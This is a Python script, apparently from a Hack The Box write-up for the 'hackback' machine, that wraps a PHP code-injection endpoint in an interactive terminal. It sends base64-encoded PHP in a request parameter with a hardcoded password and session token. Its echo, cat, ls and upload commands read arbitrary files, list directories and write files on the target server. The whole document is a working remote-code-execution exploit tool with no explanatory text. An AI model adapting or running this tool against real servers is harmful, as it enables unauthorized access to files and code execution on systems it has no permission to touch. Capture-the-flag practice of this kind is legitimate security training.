# python3
import requests
import re
from base64 import b64decode, b64encode
from cmd import Cmd

class Terminal(Cmd):
    prompt="cmd>"
    def __init__(self):
        super().__init__()
    def do_echo(self,args):
        command=f"echo (base64_encode('{args}'));"
        print(run_php(command))
    def do_cat(self,args):
        command=f"echo(base64_encode(file_get_contents('{args}')));"
        print(run_php(command))
    def do_ls(self,args):
        command="""foreach (scandir('"""+ args +"""') as $filename) { $x.=$filename."\\n";}; echo(base64_encode($x)); """
        print(run_php(command))
    def do_upload(self,args):
        src , dest = args.split(" ")
        with open(src, 'r') as read:
            for line in read:
                b64_line = b64encode(str.encode(line))
                b64_line = b64_line.decode('utf-8')
                command=f"$fp = fopen('{dest}','a');"
                command+=f"fwrite($fp, base64_decode('{b64_line}'));"
                run_php(command)
def content_print(page):
    page=page.decode('utf-8')
    m = re.search('boot(.+?)root',page)
    if m:
        return b64decode(m.group(1)).decode('utf-8')
    else:
        return 1
def run_php(php_code):
    url = "http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php"
    param = { 'action':'show','site':'hackthebox','password':'12345678','session':'84e11147e6f7100af7d1e0c38d90867f8349df2b637533de9a5810434e23c90e','gg': b64encode(str.encode(php_code)) }
    
    proxies = {'http' : 'http://127.0.0.1:8080'}
    r = requests.get(url,params=param,proxies=proxies,allow_redirects=False)
    return content_print(r.content)

term=Terminal()
term.cmdloop()

